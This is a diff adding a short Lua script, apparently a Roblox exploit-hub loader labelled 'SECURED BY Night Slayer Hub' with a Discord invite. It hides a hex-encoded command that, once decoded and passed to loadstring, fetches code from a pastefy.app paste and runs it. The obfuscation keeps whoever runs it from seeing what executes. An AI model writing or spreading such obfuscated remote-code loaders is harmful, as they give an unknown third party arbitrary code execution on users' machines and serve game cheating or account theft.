@@ -1,0 +1,15 @@
+--[[ 
+    SECURED BY Night Slayer Hub 
+    Status: Protected & Encrypted discord.gg/wWHxH6ARU
+]]
+local _raw = "6c6f6164737472696e672867616d653a48747470476574282268747470733a2f2f706173746566792e6170702f5a6b716f626858672f7261772229292829"
+local _exec = ""
+for i = 1, #_raw, 2 do
+    _exec = _exec .. string.char(tonumber(_raw:sub(i, i+1), 16))
+end
+local _run, _err = loadstring(_exec)
+if _run then
+    _run()
+else
+    warn("Error: " .. (_err or "Unknown"))
+end
